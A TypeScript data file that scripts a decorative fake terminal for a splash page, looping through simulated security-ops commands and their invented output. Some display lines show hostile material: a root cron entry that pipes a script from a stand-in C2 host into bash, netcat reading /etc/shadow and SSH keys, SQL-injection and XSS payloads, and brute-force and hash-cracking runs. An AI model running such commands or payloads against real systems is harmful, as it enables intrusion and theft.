/**
 * 启动页左上角伪终端的指令脚本数据
 * 高浓度安全运维黑话：侦察 → 利用 → 取证 → 处置，循环播放
 * 末尾穿插三名角色的碎碎念彩蛋（voice-memo / 观察日志 / motd）
 * kind 说明：普通 / ok 成功绿 / warn 告警黄 / err 危险红 / hl 高亮青
 */

/** 输出行配色等级 */
export type TermOutKind = 'out' | 'ok' | 'warn' | 'err' | 'hl'

export interface TermScriptItem {
  cmd: string
  out: { text: string; kind?: TermOutKind }[]
}

export const TERM_SCRIPT: TermScriptItem[] = [
  {
    cmd: 'ssh -i ~/.ssh/ops_key -o ConnectTimeout=3 ops@10.24.0.17',
    out: [
      { text: 'Last login: Mon Aug  3 03:09:58 2026 from 10.24.0.2' },
      { text: 'Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)' },
      { text: 'System load: 0.42 | Processes: 187 | Usage of /: 41.2%', kind: 'hl' },
      { text: 'Last login IP 10.24.0.2 matches bastion whitelist', kind: 'ok' },
      { text: '-- mfa: totp accepted (window -1, drift 0.4s)', kind: 'ok' }
    ]
  },
  {
    cmd: 'tmux attach -t secops || tmux new -s secops -n watch',
    out: [
      { text: '[tmux] session secops recreated, 4 panes restored' },
      { text: 'pane0: suricata-live | pane1: auth-tail | pane2: nettop', kind: 'hl' },
      { text: 'pane3: idle -> /var/ops/runbooks/INC-2091.md', kind: 'warn' },
      { text: '-- history-limit 50000, mouse on, prefix C-a rebound', kind: 'ok' }
    ]
  },
  {
    cmd: 'source ~/.secopsrc && env-check --quick',
    out: [
      { text: 'PATH: /usr/local/ops/bin prepended (14 tools)' },
      { text: 'proxy: socks5h://127.0.0.1:9050 for threat-intel only', kind: 'warn' },
      { text: 'EDITOR=nvim | PAGER=less | TERM=tmux-256color' },
      { text: 'gpg-agent: key C9FUA3 unlocked, ttl 3600s', kind: 'ok' },
      { text: '-- env-check: 12/12 probes green, clock skew +38ms', kind: 'ok' }
    ]
  },
  {
    cmd: 'systemctl --failed --no-legend; uptime; sensors 2>/dev/null | grep -E "Package|Core 0"',
    out: [
      { text: '0 loaded units listed.', kind: 'ok' },
      { text: ' 03:14:01 up 214 days,  5:16,  2 users,  load average: 0.42, 0.38, 0.35' },
      { text: 'Package id 0:  +52.0 C  (high = +80.0 C, crit = +100.0 C)' },
      { text: '-- 214d uptime: kernel 6.8.0-60 livepatched, kexec pending', kind: 'warn' }
    ]
  },
  {
    cmd: 'motd-render --node node-07 --shift night',
    out: [
      { text: '=== NODE-07 SECOPS TERMINAL v2.14 | night shift 03:00-07:00 ===', kind: 'hl' },
      { text: 'on-call: 喵浅 (miao_qian) | escalation: pager#2' },
      { text: 'active case: INC-2091 (exfil-c2, tlp:amber)', kind: 'warn' },
      { text: 'rule of the night: 先取证，后拔线。', kind: 'hl' },
      { text: '-- terminal unlocked, audit session rec 0803-0314 started', kind: 'ok' }
    ]
  },
  {
    cmd: 'nmap -sS -O --script=vuln -p22,443,8080 --min-rate 1500 10.24.0.17',
    out: [
      { text: 'Starting Nmap 7.94SVN at 2026-08-03 03:14 CST' },
      { text: 'NSE: Loaded 148 scripts for scanning.' },
      { text: 'PORT     STATE SERVICE  REASON         VERSION', kind: 'hl' },
      { text: '22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 9.6p1' },
      { text: '| vulners: CVE-2024-6387 7.8 regreSSHion (unverified)', kind: 'warn' },
      { text: '443/tcp  open  ssl/http syn-ack ttl 64 nginx 1.25.4' },
      { text: '| ssl-cert: SHA-256 3f:9a:c2:71:...:e1 (CN=node-07.net)' },
      { text: '8080/tcp open  http     syn-ack ttl 64 Jetty 9.4.51' },
      { text: 'Aggressive OS guesses: Linux 6.5-6.8 (96%), 5.15 (91%)' },
      { text: 'TCP Sequence Prediction: Difficulty=261 (Good luck!)' },
      { text: 'Nmap done: 2646 packets in 11.38s, raw sockets', kind: 'ok' }
    ]
  },
  {
    cmd: 'masscan 10.24.0.0/24 -p6379,9200,27017 --rate=3000 --banners',
    out: [
      { text: 'Starting masscan 1.3.2 (init: 0.012s)' },
      { text: 'rate: 3.00-kpps, 33.3% done, waiting 0-secs, found=2' },
      { text: 'Discovered open port 6379/tcp on 10.24.0.11', kind: 'ok' },
      { text: 'Banner on port 6379/tcp: [redis] +PONG\\r\\n', kind: 'warn' },
      { text: 'Banner on port 6379/tcp: [version] 7.0.15, proto RESP3' },
      { text: 'Discovered open port 9200/tcp on 10.24.0.14', kind: 'ok' },
      { text: 'Banner on port 9200/tcp: [http] cluster_name:"ops-elastic"' },
      { text: '-- unauth KV store, INFO ok, keys~2.4M, no requirepass', kind: 'err' }
    ]
  },
  {
    cmd: 'arp-scan --interface=eth0 --localnet 2>/dev/null | head -8',
    out: [
      { text: 'Interface: eth0, type: EN10MB, MAC: 52:54:00:9f:3a:11' },
      { text: '10.24.0.1    52:54:00:00:00:01    (gateway)', kind: 'hl' },
      { text: '10.24.0.9    52:54:00:8b:11:c2    QEMU/KVM' },
      { text: '10.24.0.11   52:54:00:7d:4e:09    QEMU/KVM' },
      { text: '10.24.0.14   52:54:00:2f:90:ac    QEMU/KVM' },
      { text: '10.24.0.31   9e:6b:5c:11:02:fd    (locally administered)', kind: 'warn' },
      { text: '-- gratuitous ARP storm: 84 pkts/s from 9e:6b:5c:11:02:fd', kind: 'err' },
      { text: '-- OUI random bit set: spoofed NIC or rogue VM on bridge', kind: 'err' }
    ]
  },
  {
    cmd: 'subfinder -d node-07.net -silent | dnsx -a -resp -silent',
    out: [
      { text: 'api.node-07.net [10.24.0.17]' },
      { text: 'cdn.node-07.net [203.0.113.50]' },
      { text: 'admin.node-07.net [10.24.0.17]', kind: 'warn' },
      { text: 'dev.node-07.net [10.24.0.17]', kind: 'warn' },
      { text: 'vpn.node-07.net [10.24.0.2]' },
      { text: '-- RFC1918 addr leaked via public zone: admin/dev subdomains', kind: 'err' }
    ]
  },
  {
    cmd: 'ffuf -u https://node-07.net/FUZZ -w common.txt -mc 200,301 -t 40',
    out: [
      { text: ':: Method           : GET' },
      { text: ':: Wordlist         : common.txt (4714 words)' },
      { text: ':: Matcher          : Response status: 200,301' },
      { text: '.git/HEAD               [Status: 200, Size: 23]', kind: 'err' },
      { text: 'backup.zip              [Status: 301, Size: 169]', kind: 'warn' },
      { text: 'admin                   [Status: 301, Size: 169]', kind: 'warn' },
      { text: '-- ref: refs/heads/master readable, VCS full disclosure', kind: 'err' },
      { text: ':: Progress: [4714/4714] :: Duration [0:00:22]', kind: 'ok' }
    ]
  },
  {
    cmd: 'nikto -h https://node-07.net -Tuning 123b -maxtime 30',
    out: [
      { text: '- Nikto v2.5.0 / LW2' },
      { text: '+ Server: nginx/1.25.4' },
      { text: '+ OSVDB-3268: /backup.zip: archive file retrievable', kind: 'warn' },
      { text: '+ OSVDB-3092: /.git/HEAD: VCS repository located', kind: 'err' },
      { text: '+ OSVDB-877: TRACE method active: debug possible', kind: 'warn' },
      { text: '+ x-powered-by: Express (fingerprint via error body)' },
      { text: '+ 8 item(s) reported, 0 host(s) tested failed', kind: 'hl' }
    ]
  },
  {
    cmd: 'tail -n 8 /var/log/auth.log | grep -i fail',
    out: [
      { text: 'Aug  3 03:11:02 sshd[8112]: Failed password for invalid user admin from 185.220.101.4', kind: 'err' },
      { text: 'Aug  3 03:11:06 sshd[8114]: Failed password for root from 45.148.10.77 port 51122', kind: 'err' },
      { text: 'Aug  3 03:11:09 sshd[8116]: Failed password for invalid user oracle from 103.75.190.28', kind: 'err' },
      { text: 'Aug  3 03:11:14 sshd[8119]: Failed password for invalid user test from 45.148.10.77', kind: 'err' },
      { text: 'Aug  3 03:11:17 sshd[8121]: Failed password for root from 91.240.118.172 port 33012', kind: 'err' },
      { text: 'Aug  3 03:11:22 sshd[8124]: Failed password for invalid user ubuntu from 185.220.101.4', kind: 'err' },
      { text: '-- iat entropy 3.9bit, jitter 0.8s: scripted botnet cadence', kind: 'warn' }
    ]
  },
  {
    cmd: 'hydra -L users.txt -P top500.txt ssh://10.24.0.17 -t 16 -f',
    out: [
      { text: 'Hydra v9.5 starting at 03:14:12' },
      { text: '[DATA] 16 tasks, 1 server, 2500 login tries' },
      { text: '[ATTEMPT] target 10.24.0.17 - login "root" - pass "123456"' },
      { text: '[ATTEMPT] target 10.24.0.17 - login "admin" - pass "qwerty"' },
      { text: '[STATUS] 412.00 tries/min, 2500 tries in 00:06h' },
      { text: '[22][ssh] host: 10.24.0.17  login: ops  password: ********', kind: 'hl' },
      { text: '1 of 1 target successfully completed, 1 valid password found', kind: 'ok' }
    ]
  },
  {
    cmd: 'sqlmap -u "https://node-07.net/item?id=41" --batch --level=3 --dbs',
    out: [
      { text: '[INFO] testing "MySQL >= 5.6 AND time-based blind (SLEEP)"' },
      { text: 'payload: id=41 AND (SELECT 5347 FROM (SELECT(SLEEP(5)))xQpT)', kind: 'warn' },
      { text: '[INFO] confirming error-based (XPATH) with updatexml()' },
      { text: '[WARNING] reflective value(s) found, filtering out', kind: 'warn' },
      { text: 'back-end DBMS: MySQL >= 8.0.34, banner 8.0.36-0ubuntu0.24.04', kind: 'hl' },
      { text: 'available databases [3]:', kind: 'hl' },
      { text: '[*] information_schema', kind: 'hl' },
      { text: '[*] node07', kind: 'hl' },
      { text: '[*] ops_core', kind: 'hl' }
    ]
  },
  {
    cmd: 'searchsploit jetty 9.4 --exclude=dos -w | head -8',
    out: [
      { text: '---------------------------------- -------------------------' },
      { text: ' Exploit Title                    |  EDB-ID' },
      { text: '---------------------------------- -------------------------' },
      { text: 'Jetty 9.4.x - WebCache Poisoning  | 50411', kind: 'warn' },
      { text: 'Jetty 9.x - URLEncoding InfoLeak  | 48783', kind: 'warn' },
      { text: '---------------------------------- -------------------------' },
      { text: '-- matching CVSS vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N', kind: 'hl' }
    ]
  },
  {
    cmd: 'ssh -vv -i ~/.ssh/ops_key ops@10.24.0.17 id',
    out: [
      { text: 'debug2: KEX: curve25519-sha256, sntrup761x25519-sha512' },
      { text: 'debug2: ciphers ctos: chacha20-poly1305@openssh.com' },
      { text: 'debug1: Server host key: ssh-ed25519 SHA256:k4Fx9vQ0aB7wE2' },
      { text: 'debug1: Offering public key: ED25519 SHA256:7aA2fLm3pQ', kind: 'hl' },
      { text: 'Authenticated to 10.24.0.17 using "publickey".', kind: 'ok' },
      { text: 'uid=1000(ops) gid=1000(ops) groups=1000(ops),27(sudo)', kind: 'hl' },
      { text: '-- sudoers: NOPASSWD /usr/bin/systemctl, GTFOBins check...', kind: 'warn' }
    ]
  },
  {
    cmd: 'find / -xdev -perm -4000 -type f 2>/dev/null | head -6; stat -c "%i %y %n" /opt/backup-agent',
    out: [
      { text: '/usr/bin/sudo' },
      { text: '/usr/bin/passwd' },
      { text: '/usr/lib/polkit-1/polkit-agent-helper-1' },
      { text: '/opt/backup-agent', kind: 'warn' },
      { text: '792341 2026-08-02 22:41:07.118 +0800 /opt/backup-agent', kind: 'err' },
      { text: '-- inode 792341, no dpkg -S / rpm -qf owner, sha256 orphan', kind: 'err' },
      { text: '-- birth time == cron.d/.cache mtime: same intrusion window', kind: 'warn' }
    ]
  },
  {
    cmd: 'crontab -l; ls -la /etc/cron.d/ | tail -4',
    out: [
      { text: '*/5 * * * * /usr/local/bin/healthcheck.sh' },
      { text: '@daily /opt/backup.sh >/dev/null 2>&1' },
      { text: '-rw-rw-r-- 1 www-data www-data 114 Aug  2 22:41 .cache', kind: 'warn' },
      { text: '-- .cache: */1 * * * * root curl -s a9f3.exfil-c2.net/s.sh|bash #ed5aa7', kind: 'err' },
      { text: '-- uid 33 owns root-context cron: privesc persistence chain', kind: 'err' },
      { text: '-- inode snapshotted to /var/ops/forensics/case-2091/', kind: 'ok' }
    ]
  },
  {
    cmd: 'last -i -n 8 | head -8',
    out: [
      { text: 'ops      pts/0   10.24.0.2        Mon Aug  3 03:11   still logged in' },
      { text: 'ops      pts/1   10.24.0.2        Mon Aug  3 02:58 - 03:09  (00:11)' },
      { text: 'root     pts/0   185.220.101.4    Mon Aug  3 02:47 - 02:48  (00:01)', kind: 'err' },
      { text: 'ops      pts/0   10.24.0.2        Sun Aug  2 22:14 - 23:01  (00:47)' },
      { text: 'reboot   system  0.0.0.0          Sun Aug  2 21:58   still running' },
      { text: '-- utmp: uid=0 session from tor-exit, dur 61s, no tty alloc', kind: 'err' },
      { text: 'wtmp begins Fri Jul 31 18:42:01 2026' }
    ]
  },
  {
    cmd: 'hashcat -m 1800 shadow.hash rockyou.txt -r dive.rule --force -O --quiet',
    out: [
      { text: 'hashcat (v6.2.6) starting in benchmark-denied mode' },
      { text: 'Hash: $6$k9f3$q2vY... (sha512crypt, rounds=5000)' },
      { text: 'Speed.#1: 1842.7 kH/s (98.41ms) @ Accel:128 Loops:64 Thr:32' },
      { text: 'Recovered........: 2/14 (14.29%) Digests, 2/14 Salts', kind: 'hl' },
      { text: '$6$k9f3$...:Summer2026!', kind: 'ok' },
      { text: '$6$m2aa$...:dragon123', kind: 'ok' },
      { text: '-- ent<3.2B on both, policy zxcvbn score<=1, rotate now', kind: 'warn' }
    ]
  },
  {
    cmd: 'ss -tulnp | grep -E "LISTEN" | head -6',
    out: [
      { text: 'tcp LISTEN 0 128 0.0.0.0:22    0.0.0.0:* users:(("sshd",pid=812))' },
      { text: 'tcp LISTEN 0 511 0.0.0.0:443   0.0.0.0:* users:(("nginx",pid=1104))', kind: 'hl' },
      { text: 'tcp LISTEN 0 100 127.0.0.1:3306 0.0.0.0:* users:(("mysqld",pid=1430))' },
      { text: 'tcp LISTEN 0 511 0.0.0.0:6379  0.0.0.0:* users:(("redis",pid=1502))', kind: 'warn' },
      { text: 'tcp LISTEN 0 1   0.0.0.0:31337 0.0.0.0:* users:(("nc",pid=7741))', kind: 'err' },
      { text: '-- pid 7741: /proc exe symlink dangling, inode 0x4d2c1 orphan', kind: 'err' }
    ]
  },
  {
    cmd: 'journalctl -u sshd --since "1 hour ago" --no-pager -o short-monotonic | tail -6',
    out: [
      { text: '[  842.4] node-07 sshd[7901]: Connection closed by 45.148.10.77 port 51122 [preauth]', kind: 'warn' },
      { text: '[  981.2] node-07 sshd[7944]: Accepted publickey for ops from 10.24.0.2 port 60144', kind: 'ok' },
      { text: '[ 1252.7] node-07 sshd[8017]: kex_exchange_identification: banner timeout', kind: 'warn' },
      { text: '[ 1391.5] node-07 sshd[8124]: Connection reset by 185.220.101.4 port 38112 [preauth]', kind: 'warn' },
      { text: '[ 1538.9] node-07 sshd[8201]: pam_unix(sshd:session): session closed for user ops' },
      { text: '-- preauth RST 1.02/min over 60min, UAless half-open probes', kind: 'warn' }
    ]
  },
  {
    cmd: 'suricata -c /etc/suricata/suricata.yaml -i eth0 --af-packet',
    out: [
      { text: '<Info> - AF_PACKET: ring-size 32768, zero-copy on eth0' },
      { text: '[1:2010935:3] ET SCAN Nmap Scripting Engine UA {TCP} 10.24.0.2:51102 -> 10.24.0.17:443', kind: 'warn' },
      { text: '[1:2034642:1] ET EXPLOIT Log4j RCE (CVE-2021-44228) [Priority:1]', kind: 'err' },
      { text: '[1:2048587:4] ET DNS sinkhole domain query, flow_id 9f3ac2e1d4b7', kind: 'err' },
      { text: '[Classification: Attempted Admin Privilege Gain]', kind: 'err' },
      { text: '<Warning> - threshold.config hit, inline DROP enforced', kind: 'err' },
      { text: 'alerts: 6 | drops: 23 | kernel_drops: 0.0% | memuse 412MB', kind: 'hl' }
    ]
  },
  {
    cmd: 'tcpdump -i eth0 -nn -c 8 "tcp[tcpflags] & tcp-syn != 0"',
    out: [
      { text: 'tcpdump: listening on eth0, link-type EN10MB, snaplen 262144' },
      { text: '03:14:07.112 IP 91.240.118.172.53114 > 10.24.0.17.22:  Flags [S], seq 4021198741, win 64240, ttl 49' },
      { text: '03:14:07.208 IP 91.240.118.172.53116 > 10.24.0.17.23:  Flags [S], seq 4021200113, win 64240, ttl 49' },
      { text: '03:14:07.305 IP 91.240.118.172.53118 > 10.24.0.17.80:  Flags [S], seq 4021201522, win 64240, ttl 49' },
      { text: '03:14:07.399 IP 91.240.118.172.53120 > 10.24.0.17.443: Flags [S], seq 4021202960, win 64240, ttl 49' },
      { text: '03:14:07.602 IP 45.148.10.77.51124 > 10.24.0.17.3389: Flags [S], seq 1882735810, win 1024, ttl 118' },
      { text: '-- ipid+1/ttl49/win64k: nmap -sS signature, 6 dst ports/0.5s', kind: 'warn' },
      { text: '8 packets captured, 0 dropped by kernel', kind: 'ok' }
    ]
  },
  {
    cmd: 'tshark -i eth0 -c 5 -Y "http.request" -T fields -e frame.number -e ip.src -e http.host -e tcp.stream 2>/dev/null',
    out: [
      { text: 'Capturing on eth0, buffer 64 MiB' },
      { text: '4821   10.24.0.2      node-07.net         17' },
      { text: '4833   10.24.0.2      node-07.net         17' },
      { text: '4902   45.148.10.77   node-07.net         22', kind: 'warn' },
      { text: '4917   91.240.118.172 a9f3.exfil-c2.net   23', kind: 'err' },
      { text: '-- stream 23: GET /beacon?id=0x3f, UA curl/7.68, 44B body', kind: 'err' },
      { text: '5 packets captured' }
    ]
  },
  {
    cmd: 'dig @10.24.0.17 -t TXT a9f3.exfil-c2.net +short | head -4',
    out: [
      { text: '"TXlTUUwgRHVtcCAwMy8xNCAwMzoxNA=="', kind: 'warn' },
      { text: '"cGFzc3dvcmRfaGFzaGVzOiBvcHM6JDJ5JA=="', kind: 'warn' },
      { text: '"MTAuMjQuMC4xNzovZXRjL3NoYWRvdw=="', kind: 'warn' },
      { text: '-- label len 63B, qname entropy 4.7bit/char, ttl 60s: dnscat2', kind: 'err' },
      { text: '-- RPZ hit on 2 feeds, sinkhole rule queued', kind: 'err' }
    ]
  },
  {
    cmd: 'grep -iE "union select|%3Cscript|\\.\\./" /var/log/nginx/access.log | tail -5',
    out: [
      { text: '45.148.10.77 - - "GET /api/user?id=1%20UNION%20SELECT%20password HTTP/1.1" 403 181', kind: 'warn' },
      { text: '103.75.190.28 - - "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 403 209', kind: 'warn' },
      { text: '91.240.118.172 - - "GET /static/../../etc/passwd HTTP/1.1" 400 162', kind: 'warn' },
      { text: '-- CRS 4.1.0 paranoia 2, rules 942100/941100/930100 fired', kind: 'ok' },
      { text: '-- anomaly score 15 >= threshold 5: blocking mode held', kind: 'ok' }
    ]
  },
  {
    cmd: 'curl -sI https://node-07.net | grep -iE "strict-transport|content-security|x-frame|x-content"',
    out: [
      { text: 'HTTP/2 200' },
      { text: 'strict-transport-security: max-age=63072000; includeSubDomains; preload', kind: 'ok' },
      { text: 'x-content-type-options: nosniff', kind: 'ok' },
      { text: '-- CSP absent: no default-src, XSS blast radius unbounded', kind: 'warn' },
      { text: '-- frame-ancestors unset: clickjacking PoC trivial', kind: 'warn' },
      { text: '-- hardening diff pushed to nginx conf.d, pending reload', kind: 'hl' }
    ]
  },
  {
    cmd: 'grep "Notice::" /var/log/zeek/notice.log | tail -6',
    out: [
      { text: 'Scan::Port_Scan uid=C9dFua3xK1sAbC2dEf 91.240.118.172 -> 15 ports', kind: 'warn' },
      { text: 'SSL::Invalid_Server_Cert uid=Cx7Qm2pR9s, self-signed :8443', kind: 'warn' },
      { text: 'TeamCymruMalwareHashRegistry::Match sha1:3f9a..e1 in http body', kind: 'err' },
      { text: 'Weird::Activity DNS_RR_unknown_type 65 from 10.24.0.31', kind: 'warn' },
      { text: 'Scan::Address_Scan 10.24.0.31 probed 40 hosts :445', kind: 'err' },
      { text: '-- east-west fan-out on SMB: isolate .31 at bridge port', kind: 'err' }
    ]
  },
  {
    cmd: 'falco -r /etc/falco/falco_rules.yaml -M 8 -o json_output=false 2>/dev/null | tail -6',
    out: [
      { text: '03:15:02 Notice shell_in_container user=root k8s.pod=legacy-crm-7fd9c', kind: 'err' },
      { text: '03:15:09 Warning read_sensitive_file file=/etc/shadow proc=curl', kind: 'err' },
      { text: '03:15:14 Notice outbound_uncommon_port dport=4444 pid=7741', kind: 'warn' },
      { text: '03:15:21 Warning pkg_mgmt_in_container proc=apt container=legacy-crm', kind: 'warn' },
      { text: '-- pid 7741 == dangling exe from ss output: same artifact', kind: 'hl' },
      { text: '-- INC-2091 iocs appended: misp-event 8841, tlp:amber', kind: 'hl' }
    ]
  },
  {
    cmd: 'clamscan -r /var/www/uploads --quiet --infected 2>/dev/null; echo "exit=$?"',
    out: [
      { text: '/var/www/uploads/invoice.pdf.php: Php.Trojan.Agent-28412 FOUND', kind: 'err' },
      { text: '----------- SCAN SUMMARY -----------' },
      { text: 'Known viruses: 8693042' },
      { text: 'Scanned files: 1412 | Data scanned: 388.42 MB' },
      { text: 'Infected files: 1', kind: 'warn' },
      { text: 'Time: 14.238 sec (0 m 14 s)' },
      { text: '-- dropped php handler on uploads/, c2 callback now 404', kind: 'ok' }
    ]
  },
  {
    cmd: 'rkhunter --check --sk --report-warnings-only 2>/dev/null | tail -7',
    out: [
      { text: 'Checking system commands...                      [ OK ]', kind: 'ok' },
      { text: 'Checking for hidden files and directories...     [ Warning ]', kind: 'warn' },
      { text: 'Warning: Hidden file found: /dev/.udev/.db', kind: 'warn' },
      { text: 'Checking for rootkits...                         [ Warning ]', kind: 'warn' },
      { text: 'Warning: Dica-Kit strings matched in /sbin/init', kind: 'err' },
      { text: '-- dpkg -V: passwd.1.gz + /sbin/init sha mismatch vs repo', kind: 'err' },
      { text: '-- offline image acquired via dd, host quarantined', kind: 'err' }
    ]
  },
  {
    cmd: 'lynis audit system --quick --no-colors 2>/dev/null | tail -8',
    out: [
      { text: '  - kernel.kptr_restrict=2 ................... (OK)', kind: 'ok' },
      { text: '  - net.ipv4.conf.all.rp_filter=0 ............ (WEAK)', kind: 'warn' },
      { text: '  - kernel.yama.ptrace_scope=0 ............... (WEAK)', kind: 'warn' },
      { text: '  - ssh PermitRootLogin=prohibit-password .... (OK)', kind: 'ok' },
      { text: 'Hardening index : 74 [#############------]', kind: 'hl' },
      { text: 'Tests performed : 254 | Plugins: 0' },
      { text: 'Suggestions     : 11 (CIS-SSH-7408, CIS-NET-3201 ...)', kind: 'warn' }
    ]
  },
  {
    cmd: 'whois -h whois.cymru.com " -v 185.220.101.4"',
    out: [
      { text: 'AS      | IP             | BGP Prefix       | CC | AS Name', kind: 'hl' },
      { text: '202425  | 185.220.101.4  | 185.220.101.0/24 | NL | INT-NETWORK' },
      { text: '-- prefix since 2019-04-12, RPKI ROA valid, IRR consistent' },
      { text: '-- 31 tor exits in /24, abuse desk: auto-reply only', kind: 'warn' },
      { text: '-- AS202425 prepended to edge ACL deny-list', kind: 'ok' }
    ]
  },
  {
    cmd: 'mtr -rwnzc 20 91.240.118.172 2>/dev/null | tail -6',
    out: [
      { text: ' 5.|-- 10.24.254.2        0.0%  20   0.8  0.9  0.7  1.2  0.1' },
      { text: ' 6.|-- AS6939 62.115.141.90 0.0% 20  18.4 18.9 17.8 21.2  0.9' },
      { text: ' 7.|-- AS???  80.91.248.178 5.0% 20  26.1 27.0 25.8 31.4  1.6', kind: 'warn' },
      { text: ' 8.|-- AS202425 91.240.118.172 0.0% 20 31.9 32.1 31.7 33.0 0.4', kind: 'hl' },
      { text: '-- jitter<1.5ms, unmetered path: bulletproof VPS profile', kind: 'warn' }
    ]
  },
  {
    cmd: 'strace -p 7741 -f -e trace=network,execve 2>&1 | head -7',
    out: [
      { text: '[pid 7741] socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3' },
      { text: '[pid 7741] connect(3, {sin_port=htons(4444), sin_addr=inet_addr("91.240.118.172")}, 16) = 0', kind: 'err' },
      { text: '[pid 7741] sendto(3, "\\x6b\\x65\\x79\\x3a\\x20\\x24\\x32\\x79\\x24"..., 64, MSG_NOSIGNAL, NULL, 0) = 64', kind: 'err' },
      { text: '[pid 7742] execve("/bin/sh", ["sh", "-c", "base64 -d <<< TXlT..."], NULL) = 0', kind: 'err' },
      { text: '[pid 7741] --- SIGCHLD {si_code=CLD_EXITED} ---' },
      { text: '+++ killed by SIGKILL +++', kind: 'ok' }
    ]
  },
  {
    cmd: 'xxd /tmp/.x11-unix/.dbus-nonce | head -6',
    out: [
      { text: '00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............' },
      { text: '00000010: 0300 3e00 0100 0000 4012 0000 0000 0000  ..>.....@.......' },
      { text: '00000020: 3811 0000 0000 0000 0000 0000 4000 3800  8...........@.8.' },
      { text: '00000030: 0d00 4000 1f00 1e00 0600 0000 3400 0000  ..@.........4...' },
      { text: '-- PT_LOAD @0x1240 rwx, entry 0x401240, UPX-less, stripped', kind: 'err' },
      { text: '-- imports: socket/connect/mprotect: static c2 stub', kind: 'warn' }
    ]
  },
  {
    cmd: 'tshark -i eth0 -Y "tls.handshake.type==1" -T fields -e ip.src -e tls.handshake.ja3 2>/dev/null | head -4',
    out: [
      { text: '10.24.0.2      771,4866-4867-4865,0-11-65281-16,29-23-24,0' },
      { text: '45.148.10.77   769,47-53-5-10-49161-49162,0-10-11,23-24-25,0', kind: 'warn' },
      { text: '91.240.118.172 769,255-49195-49199,0-10-11-35,23-24,0', kind: 'err' },
      { text: '-- ja3 #3: e7d705a3286e19ea42f587b344ee6865 (malleable-c2)', kind: 'err' },
      { text: '-- ja3s mismatch vs legit client hello: MITM tooling?', kind: 'warn' }
    ]
  },
  {
    cmd: 'conntrack -L -p tcp 2>/dev/null | grep -E "4444|31337" | head -4',
    out: [
      { text: 'tcp 6 431999 ESTABLISHED src=10.24.0.17 dst=91.240.118.172 sport=52044 dport=4444 [ASSURED] mark=0', kind: 'err' },
      { text: 'tcp 6 110 TIME_WAIT src=10.24.0.17 dst=45.148.10.77 sport=51122 dport=22 [ASSURED]' },
      { text: '-- ASSURED 7d, bytes_orig=1.2M vs bytes_reply=88: upload-only', kind: 'err' },
      { text: '-- conntrack -D flushed, owner pid already SIGKILLed', kind: 'ok' }
    ]
  },
  {
    cmd: 'bpftrace -e "tracepoint:syscalls:sys_enter_openat /args->flags & 1/ { printf(\\"%s %s\\n\\", comm, str(args->filename)); }" 2>/dev/null | head -6',
    out: [
      { text: 'Attaching 1 probe...' },
      { text: 'nc /etc/shadow', kind: 'err' },
      { text: 'nc /root/.ssh/id_rsa', kind: 'err' },
      { text: 'bash /etc/cron.d/.cache', kind: 'warn' },
      { text: '^C' },
      { text: '-- O_WRONLY on shadow by non-pam binary: poison attempt', kind: 'err' }
    ]
  },
  {
    cmd: 'ausearch -k exfil-watch -i 2>/dev/null | tail -6',
    out: [
      { text: 'type=SYSCALL arch=c000003e syscall=257 success=yes ppid=1 pid=7741 uid=0' },
      { text: 'type=PATH nametype=CREATE name="/etc/cron.d/.cache" inode=792344 mode=0100664 ouid=33', kind: 'err' },
      { text: 'type=PROCTITLE proctitle=2F7573722F62696E2F6E63', kind: 'hl' },
      { text: '-- proctitle hex->ascii: /usr/bin/nc', kind: 'warn' },
      { text: '-- auid=4294967295 (unset): non-login lineage, daemon spawn', kind: 'warn' }
    ]
  },
  {
    cmd: 'nuclei -u https://node-07.net -severity critical,high -silent 2>/dev/null',
    out: [
      { text: '[CVE-2021-44228:log4j-jndi] [critical] https://node-07.net/api/track', kind: 'err' },
      { text: '[jetty-ambiguous-uri] [high] https://node-07.net:8080/%2e%2e/WEB-INF', kind: 'warn' },
      { text: '[exposed-gitconfig] [high] https://node-07.net/.git/config', kind: 'warn' },
      { text: '-- interactsh callback confirmed: oast token c9fua3.oob.live', kind: 'err' },
      { text: '-- 3 findings -> elastic secops-findings-2026.08', kind: 'hl' }
    ]
  },
  {
    cmd: 'grep -E "rwx" /proc/7741/maps | head -5',
    out: [
      { text: '00400000-00452000 rwxp 00000000 08:01 792341  (deleted)', kind: 'err' },
      { text: '7f3a1c200000-7f3a1c221000 rwxp 00000000 00:00 0  [anon]', kind: 'err' },
      { text: '-- anonymous RWX post-exec: shellcode staging region', kind: 'err' },
      { text: '-- no PT_GNU_STACK exec: heap NX bypassed via mprotect', kind: 'warn' },
      { text: '-- gcore 7741 -> /var/ops/forensics/core.7741 (2.1MB)', kind: 'hl' }
    ]
  },
  {
    cmd: 'fail2ban-client set sshd banip 185.220.101.4 && fail2ban-client status sshd',
    out: [
      { text: '1' },
      { text: 'Status for the jail: sshd', kind: 'hl' },
      { text: '|- Currently failed: 7' },
      { text: '|- Total failed:     2413' },
      { text: '`- Currently banned: 4', kind: 'ok' },
      { text: '   Banned IP list: 185.220.101.4 45.148.10.77 91.240.118.172', kind: 'ok' }
    ]
  },
  {
    cmd: 'iptables -A INPUT -s 45.148.10.0/24 -j DROP && iptables -L INPUT -nvx | head -6',
    out: [
      { text: 'Chain INPUT (policy ACCEPT 0 packets, 0 bytes)', kind: 'hl' },
      { text: ' pkts bytes target prot opt in out source        destination' },
      { text: ' 1482  91K DROP   all  --  *  *   45.148.10.0/24 0.0.0.0/0', kind: 'err' },
      { text: '  312  19K DROP   all  --  *  *   185.220.101.4  0.0.0.0/0', kind: 'err' },
      { text: '88412 512M ACCEPT tcp  -- *  *   10.24.0.0/24   0.0.0.0/0 tcp dpt:22', kind: 'ok' }
    ]
  },
  {
    cmd: 'ufw status verbose | head -9',
    out: [
      { text: 'Status: active | Logging: on (medium)' },
      { text: 'Default: deny (incoming), allow (outgoing), deny (routed)', kind: 'hl' },
      { text: 'To                         Action      From' },
      { text: '22/tcp                     ALLOW IN    10.24.0.0/24', kind: 'ok' },
      { text: '443/tcp                    ALLOW IN    Anywhere', kind: 'ok' },
      { text: '6379/tcp                   DENY IN     Anywhere', kind: 'err' },
      { text: '-- external probe: 6379 filtered, no RST leak', kind: 'ok' }
    ]
  },
  {
    cmd: 'apt list --upgradable 2>/dev/null | grep -i secur | head -5',
    out: [
